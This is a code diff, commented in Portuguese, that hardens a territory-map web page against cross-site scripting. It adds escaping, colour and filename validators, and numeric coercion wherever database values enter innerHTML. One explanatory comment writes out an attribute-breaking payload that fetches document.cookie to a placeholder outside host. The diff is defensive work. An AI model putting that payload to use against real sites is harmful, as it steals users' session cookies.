@@ -415,6 +415,56 @@ async function carregar() {
 
 const cor = (n) => guildas[dono[n]]?.cor || 'var(--neutro)';
 
+// ---- O que vem do banco e vira HTML ----
+//
+// Estas páginas montam texto e entregam a `innerHTML`, que **parseia** o que
+// recebe. As tabelas são fechadas para escrita -- a chave publicável não tem
+// política de insert, update nem delete --, então nenhum visitante alcança
+// isto hoje. Mas a porta não tinha fechadura: bastava uma política de escrita
+// acrescentada por engano, ou a service key vazando, e um valor guardado como
+//
+//     red" onload="fetch('https://algum-lugar/'+document.cookie)
+//
+// fecharia o atributo antes da hora e o resto viraria um manipulador de
+// evento. Note que não é preciso `<script>` -- o caractere que faz o estrago
+// é a aspa, e é por isso que trocar só `<` e `>` não bastaria.
+//
+// A cinquenta linhas daqui a linha 447 já fazia certo, com `setAttribute`,
+// que não parseia HTML. Mesmo dado, dois caminhos, um seguro e outro não.
+
+const escapa = (s) => String(s ?? '').replace(/[&<>"]/g, c =>
+  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c]);
+
+/**
+ * Uma cor do banco entrando num atributo `style`, e **escapar não basta
+ * aqui**: `url(https://…)` não contém nenhum dos caracteres que o escapador
+ * troca, então atravessaria intacto e a página buscaria um recurso externo --
+ * a mesma armadilha que `enderecoWeb()` resolve para o link do streamer.
+ *
+ * Só passam as formas que uma cor de verdade tem. Qualquer outra coisa cai no
+ * neutro, porque um território sem cor é o estado que a página já sabe
+ * desenhar.
+ */
+const corSegura = (c) => {
+  const v = String(c ?? '').trim();
+  return /^(#[0-9a-f]{3,8}|var\(--[a-z-]+\)|[a-z]+)$/i.test(v)
+    ? v
+    : 'var(--neutro)';
+};
+
+/**
+ * O nome do arquivo do brasão, que vira parte de um `src`.
+ *
+ * Validado em vez de escapado pelo mesmo motivo: escapar impediria a quebra do
+ * atributo, mas ainda deixaria apontar para qualquer caminho relativo. Um
+ * brasão é um nome de arquivo, e só isso passa. O vazio é um estado que a
+ * página já trata -- o território fica com a cor e sem símbolo, nunca com uma
+ * caixa quebrada.
+ */
+const arquivoSeguro = (f) =>
+  /^[\w.-]+\.(png|webp|svg|jpg|jpeg)$/i.test(String(f ?? '')) ? String(f) : '';
+
+
 function pintar() {
   const mapa = document.querySelector('.quadro svg');
   document.getElementById('icones')?.remove();
@@ -444,7 +494,7 @@ function pintar() {
 
     if (g && g.brasao) {
       const img = document.createElementNS(SVG, 'image');
-      img.setAttribute('href', 'icones/' + g.brasao);
+      img.setAttribute('href', 'icones/' + arquivoSeguro(g.brasao));
       img.setAttribute('x', x - lado / 2);
       img.setAttribute('y', y);
       img.setAttribute('width', lado);
@@ -484,9 +534,9 @@ function desenharLegenda() {
     Object.entries(guildas)
       .sort((a, b) => (conta[b[0]] || 0) - (conta[a[0]] || 0))
       .map(([n, g]) =>
-        `<div class="guild"><i style="background:${g.cor}"></i>`
-        + (g.brasao ? `<img src="icones/${g.brasao}" alt="">` : '')
-        + `${n}<span class="qtd">${conta[n] || 0}</span></div>`)
+        `<div class="guild"><i style="background:${corSegura(g.cor)}"></i>`
+        + (arquivoSeguro(g.brasao) ? `<img src="icones/${arquivoSeguro(g.brasao)}" alt="">` : '')
+        + `${escapa(n)}<span class="qtd">${Number(conta[n]) || 0}</span></div>`)
       .join('')
     + `<div class="guild"><i style="background:var(--neutro)"></i>sem dono<span class="qtd">${semDono}</span></div>`
     + (emGuerra
@@ -497,13 +547,13 @@ function desenharLegenda() {
 function desenharLista() {
   document.getElementById('lista').innerHTML = Object.entries(territorios)
     .sort((a, b) => a[0] - b[0]).map(([n, t]) => {
-      return `<div class="item${t.capital ? ' cap' : ''}${ficha[n] ? ' tem-ficha' : ''}" data-n="${n}">
-        <span class="dot" style="background:${cor(n)}"></span>
+      return `<div class="item${t.capital ? ' cap' : ''}${ficha[n] ? ' tem-ficha' : ''}" data-n="${Number(n)}">
+        <span class="dot" style="background:${corSegura(cor(n))}"></span>
         <span class="id">${String(n).padStart(2, '0')}</span>
-        <span class="nm">${t.nome}</span>
+        <span class="nm">${escapa(t.nome)}</span>
         ${guerra[n] ? '<span class="fogo">GUERRA</span>' : ''}
         ${ficha[n] ? '<span class="ler">ler ›</span>' : ''}
-        <span class="g${t.gold > 150 ? ' alto' : ''}">${t.gold}</span></div>`;
+        <span class="g${t.gold > 150 ? ' alto' : ''}">${Number(t.gold) || 0}</span></div>`;
     }).join('');
   ligarEventos(document.querySelectorAll('.item'), el => el.dataset.n);
 }
@@ -512,13 +562,13 @@ const info = document.getElementById('info');
 function mostrar(n) {
   const t = territorios[n], g = guildas[dono[n]];
   info.innerHTML =
-    `<div class="num">TERRITÓRIO ${String(n).padStart(2, '0')} · ${t.gold} de gold</div>`
-    + `<div class="nome">${t.nome}</div>`
+    `<div class="num">TERRITÓRIO ${String(Number(n)).padStart(2, '0')} · ${Number(t.gold) || 0} de gold</div>`
+    + `<div class="nome">${escapa(t.nome)}</div>`
     + (t.capital ? '<div class="cap">capital</div>' : '')
     + (dono[n]
-        ? `<div class="dono" style="color:${g?.cor || 'inherit'}">`
-          + (g?.brasao ? `<img src="icones/${g.brasao}" alt="">` : '')
-          + `${dono[n]}</div>`
+        ? `<div class="dono" style="color:${corSegura(g?.cor)}">`
+          + (arquivoSeguro(g?.brasao) ? `<img src="icones/${arquivoSeguro(g.brasao)}" alt="">` : '')
+          + `${escapa(dono[n])}</div>`
         : '<div class="dono vazio">sem dono</div>')
     + (guerra[n] ? '<div class="guerra">EM GUERRA</div>' : '')
     + (ficha[n] ? '<div class="ler">Abrir ficha ›</div>' : '');
@@ -526,7 +576,7 @@ function mostrar(n) {
 
 function acender(n, liga) {
   document.getElementById('t' + n)?.classList.toggle('on', liga);
-  document.querySelector(`.item[data-n="${n}"]`)?.classList.toggle('on', liga);
+  document.querySelector(`.item[data-n="${Number(n)}"]`)?.classList.toggle('on', liga);
 }
 
 // Os dois lados se acendem: passar na lista destaca no mapa, e vice-versa.
